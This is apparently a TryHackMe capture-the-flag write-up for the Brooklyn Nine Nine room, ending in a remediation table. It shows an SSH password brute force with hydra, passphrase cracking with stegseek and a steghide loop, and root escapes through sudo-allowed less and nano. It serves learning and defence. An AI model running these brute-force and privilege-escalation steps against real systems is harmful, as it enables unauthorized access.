# TryHackMe — Brooklyn Nine Nine

| | |
|---|---|
| **Platform** | TryHackMe |
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu 18.04) |
| **Date** | 2026-11-27 |
| **Skills** | Anonymous FTP, SSH brute force, steganography password cracking (stegseek), `sudo less`, `sudo nano` |

> Flags and passwords are redacted, following TryHackMe's write-up guidelines.

## Summary

This room has **two independent paths to root**, and I did both.

- **Path 1:** anonymous FTP holds a note saying **jake**'s password is weak. hydra finds it in seconds. jake can run **`less` as root** without a password.
- **Path 2:** the web page hides an HTML comment pointing to **steganography**. The page's image contains a file protected by a weak passphrase. stegseek cracks it and reveals **holt**'s password. holt can run **`nano` as root** without a password.

## 1. Reconnaissance

```bash
sudo nmap -p- --min-rate 1000 -T4 -oN ports.txt <TARGET>
nmap -p 21,22,80 -sV -sC -oN serveis.txt <TARGET>
```

| Port | Service | Notes |
|---|---|---|
| 21 | vsftpd 3.0.3 | `ftp-anon: Anonymous FTP login allowed`, file `note_to_jake.txt` |
| 22 | OpenSSH 7.6p1 (Ubuntu) | |
| 80 | Apache 2.4.29 (Ubuntu) | No title |

The scripts already listed a file on anonymous FTP, so that came first.

**Dead end:** on the first pass I went straight from FTP to brute force and never opened port 80. I rooted the box that way, but missed half of it. I only came back to the web because I knew the room had a second path. Every open port deserves a look, even after one path works.

## Path 1 — FTP note → hydra → sudo less

### Anonymous FTP

```
ftp <TARGET>          # user: anonymous, empty password
ftp> ls -la
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
ftp> get note_to_jake.txt
```

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

Three possible usernames (amy, jake, holt). This time the target is the person **mentioned**, not the author: the note itself says jake's password is weak.

### SSH brute force

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt -t 4 ssh://<TARGET>
```

```
[22][ssh] host: <TARGET>   login: jake   password: <redacted>
```

Found in **5 seconds**: the password sits near the top of rockyou.

```bash
ssh jake@<TARGET>
```

jake's home is empty, so I checked every home directory. The user flag is in `/home/holt/user.txt`, readable by everyone.

### Privilege escalation — sudo less

```
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

GTFOBins → less → Sudo. `less` can run shell commands with `!`, and under sudo they run as root:

```bash
sudo less /etc/hosts
!/bin/sh
```

```
# whoami
root
```

`root.txt` is in `/root`.

## Path 2 — steganography → holt → sudo nano

Starting again from the outside, without using jake's access.

### The HTML comment

```bash
curl -s http://<TARGET> | grep -n '<!--'
```

```
30:<!-- Have you ever heard of steganography? -->
```

The only content on the page is a background image, `brooklyn99.jpg`. I downloaded it.

### Analysing the image

Following my usual order, quickest checks first: `file`, `exiftool`, `strings` and `binwalk` found nothing unusual:

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
```

steghide hides data inside the pixels of a JPEG, protected by a passphrase:

```
$ steghide info brooklyn99.jpg
  format: jpeg
  capacity: 3.5 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
steghide: can not uncompress data. compressed data is corrupted.
```

With an empty passphrase it fails, which means **there is something embedded, protected with a passphrase**.

**Dead end:** with no passphrase, I left the image and ran gobuster. That part was reasonable: I hadn't enumerated the web yet, and in other rooms a password was sitting in a web file. It returned only the standard Apache `403`s (`.ht*`, `server-status`). The real mistake was assuming the passphrase couldn't be cracked because I didn't know a tool for it. A file protected by a password, sitting on my own machine, can always be brute-forced: with a dedicated tool or with a plain loop. The better move was to run both at once, gobuster against the web in one terminal and offline cracking in another.

### Cracking the passphrase — stegseek

stegseek tries every word of a wordlist against a steghide file, very fast:

```bash
sudo apt install stegseek
stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

(I ran it without the wordlist argument; stegseek uses rockyou by default.)

Without stegseek, steghide itself in a loop does the same, only slower:

```bash
while read p; do
  steghide extract -sf brooklyn99.jpg -p "$p" -f 2>/dev/null && echo "FOUND: $p" && break
done < /usr/share/wordlists/rockyou.txt
```

```
[i] Found passphrase: "<redacted>"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".
```

```
Holts Password:
<redacted>

Enjoy!!
```

Cracking happens on Kali, so it works even while the target is down. That mattered here: the machine expired during my gobuster scan (all requests turned into `connection refused` at 95%), and I had to restart it with a new IP.

### Privilege escalation — sudo nano

```bash
ssh holt@<TARGET>
sudo -l
```

```
User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

Before checking, I wondered whether `!/bin/bash` would work inside nano as it does in less. It doesn't: each binary has its own escape. GTFOBins → nano → Sudo:

```
sudo nano
Ctrl+R        (Read File)
Ctrl+X        (Execute Command)
reset; sh 1>&0 2>&0
```

`1>&0 2>&0` sends the shell's output to the terminal instead of nano's buffer. The root shell appears mixed with nano's interface; typing `reset` cleans the screen.

```
# whoami
root
```

The `nano.save` file in holt's home (owned by root) turned out to be a leftover from the room's creator: the output of the same nano escape.

## Attack chains

```
Path 1: nmap → anonymous FTP → note_to_jake.txt
             → hydra (rockyou) → jake over SSH
             → sudo -l = (ALL) NOPASSWD: /usr/bin/less → !/bin/sh → root

Path 2: nmap → port 80 → HTML comment "steganography"
             → brooklyn99.jpg → steghide needs a passphrase
             → stegseek (rockyou) → note with holt's password → holt over SSH
             → sudo -l = (ALL) NOPASSWD: /bin/nano → Ctrl+R Ctrl+X → root
```

## Root causes and remediation

| Issue | Fix |
|---|---|
| Anonymous FTP with an internal note | Disable anonymous login; never store internal messages on a public share |
| Weak SSH password, cracked in seconds | Enforce a password policy; prefer SSH keys and disable password authentication |
| No brute-force protection on SSH | fail2ban or rate limiting |
| Password hidden in a public image with a weak passphrase | Steganography is not encryption; never put credentials in public files |
| Hint left in an HTML comment | Strip comments from production pages |
| `sudo less` and `sudo nano` with NOPASSWD | Pagers and editors can spawn shells; use `sudoedit` for editing files as root, and grant only the commands a user needs |

## Lessons learned

- **Look at every open port**, even after one path works. Here port 80 was a whole second path to root.
- **Read who a note is about, not only who wrote it**: here the target was the person mentioned.
- **A local file protected by a password can always be brute-forced**, with a dedicated tool (`zip2john` + john, **stegseek**) or a loop. Not knowing the tool doesn't mean it can't be done.
- **Two valid leads, one of them offline? Run both in parallel.**
- **steghide failing with an empty passphrase still tells you something**: data is there.
- **Each GTFOBins binary has its own escape**: `!` works in less and vim, not in nano.
- **Offline work doesn't need the target**: when a machine expires, only the steps that touch it need repeating.
